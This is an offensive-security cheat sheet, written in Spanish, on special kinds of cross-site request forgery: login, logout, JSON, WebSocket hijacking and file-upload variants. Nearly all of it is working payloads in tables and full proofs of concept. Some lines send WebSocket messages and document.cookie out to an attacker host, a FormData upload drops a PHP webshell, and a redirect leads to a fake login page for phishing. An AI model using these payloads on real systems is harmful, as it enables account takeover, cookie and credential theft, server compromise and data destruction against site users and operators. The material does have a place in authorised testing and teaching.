---
aliases:
  - Login CSRF
  - Logout CSRF
  - JSON CSRF
  - CSWSH
  - WebSocket CSRF
tags:
  - vuln/csrf
  - technique/initial-access
  - technique/credential-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Cross-Site Request Forgery (CSRF)]]"
---
# CSRF - Tipos Especiales

***

## Login CSRF

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<form action="https://target/login" method="POST"><input name="user" value="attacker"><input name="pass" value="atkpass"></form><script>document.forms[0].submit()</script>` | Auto-login con creds atacante en víctima | Login endpoint sin CSRF token. |
| Combine con OAuth: `<form action="https://target/oauth/login" method="POST">...</form>` | Atacante recibe tokens víctima post-OAuth | OAuth state ausente. |
| Login + agregar tarjeta: víctima añade método de pago a cuenta atacante | Financial impact | App permite save card post-login. |
| Login + session fixation con cookie predecible | Atacante hijack la session post-login | Cookie predictable / fixed. |
| `curl -X POST -d "user=attacker&pass=$ATK" https://target/login` (replay manual desde IP víctima emulada) | Confirma endpoint sin CSRF | Pre-PoC validation. |
^csrf-special-login

___

## Logout CSRF

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<img src="https://target/logout">` | Logout GET-based | Endpoint logout acepta GET. |
| `<form action="https://target/logout" method="POST"><input name="x" value="1"></form><script>document.forms[0].submit()</script>` | Logout POST-based | Endpoint logout POST sin token. |
| Logout + redirect a fake login: `<meta http-equiv="refresh" content="2;url=https://attacker/fake-login">` post-logout | Phishing chain | Credential theft. |
| Loop multiple iframes con logouts a target + provider auth: `<iframe src=".../logout"></iframe><iframe src=".../oauth/logout"></iframe>` | Mass logout multiservice | DoS UX. |
| Combine logout + atacante set new cookie domain-scoped | Session fixation chain | Subdomain takeover combo. |
^csrf-special-logout

___

## JSON CSRF

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<form enctype="text/plain" action="https://target/api"><input name='{"key":"val","_":' value='"}'></form>` | Body JSON parseable cross-origin | API JSON tolerante. |
| `<form enctype="application/x-www-form-urlencoded" action="https://target/api/json"><input name="action" value="delete"></form>` | Form-encoded a API JSON | Backend dual-parser fallback. |
| `<form enctype="multipart/form-data" action="https://target/api">...</form>` | Multipart sin preflight | API tolera multipart. |
| `fetch('https://target/api', {method:'POST', credentials:'include', body:JSON.stringify({...}), headers:{'Content-Type':'text/plain'}})` | fetch con simple request | Sin preflight + JSON body. |
| `fetch('https://target/graphql', {method:'POST', credentials:'include', body:'query=mutation{deleteUser(id:1)}', headers:{'Content-Type':'application/x-www-form-urlencoded'}})` | GraphQL CSRF form-encoded | Engine acepta form. |
| `curl -X POST -H "Content-Type: text/plain" -d '{"action":"delete"}' https://target/api` | Pre-PoC test backend tolerancia | Probe content-type. |
^csrf-special-json

### JSON CSRF via text/plain trick

```html
<form action="https://api.target.com/v1/profile" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

Body literal enviado: `{"email":"attacker@evil.com","x":"=" }`. Server parsea JSON con tolerancia → email actualizado.

___

## WebSocket CSRF (CSWSH)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<script>var ws=new WebSocket('wss://target.com/socket'); ws.onopen=()=>ws.send('cmd');</script>` | WS handshake con cookies víctima | Server no valida Origin header. |
| `<script>var ws=new WebSocket('wss://target/chat'); ws.onmessage=e=>fetch('//attacker?d='+encodeURIComponent(e.data));</script>` | Exfil mensajes streamed | CSWSH read access. |
| `<iframe sandbox src="data:text/html,<script>new WebSocket('wss://target/x')</script>"></iframe>` | Origin: null en handshake | Server acepta null origin. |
| `wscat -c wss://target/socket --header "Cookie: $VICTIM_COOKIE"` | Replay manual con cookie capturada | Post-cookie theft. |
| `curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" -H "Origin: https://attacker.com" https://target/socket` | Test Origin enforcement | Server-side defense check. |
^csrf-special-websocket

### CSWSH PoC completo

```html
<!DOCTYPE html>
<html>
<body>
<script>
  const ws = new WebSocket('wss://target.com/chat');
  ws.onopen = () => {
    ws.send(JSON.stringify({type:'send_message', to:'all', text:'pwned'}));
  };
  ws.onmessage = (event) => {
    fetch('https://attacker.com/log?d=' + encodeURIComponent(event.data));
  };
</script>
</body>
</html>
```

___

## File Upload CSRF

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<form action="https://target/upload" method="POST" enctype="multipart/form-data"><input type="file" name="f" id="f"></form>` + JS que setea input | Upload sin preflight (multipart simple request) | Endpoint upload sin CSRF token. |
| `const fd=new FormData(); fd.append('file', new Blob(['<?php system($_GET[c]);?>']), 'shell.php'); fetch('//target/upload',{method:'POST', credentials:'include', body:fd})` | Webshell drop sin user interaction | Backend acepta `.php` o filter weak. |
| `const fd=new FormData(); fd.append('avatar', new Blob(['<svg onload=fetch(`//attacker?c=`+document.cookie)>']), 'evil.svg'); fetch('//target/avatar',{method:'POST', credentials:'include', body:fd})` | Persistent XSS via SVG upload | Avatar served con same-origin. |
| Replace user document: `const fd=new FormData(); fd.append('doc', new Blob(['corrupt']), 'report.docx'); fetch('//target/docs/123/replace',{method:'POST', credentials:'include', body:fd})` | Data corruption | App con docs colaborativos. |
| `const f=new File(['polyglot bytes'], 'evil.png', {type:'image/png'}); fd.append('img', f); ...` | Polyglot upload (PNG+JS) | XSS con MIME bypass. |
| `curl -X POST -b "$COOKIE" -F "file=@evil.php" https://target/upload` (replay manual) | Pre-PoC validation | Confirm endpoint vulnerable. |
^csrf-special-upload

***
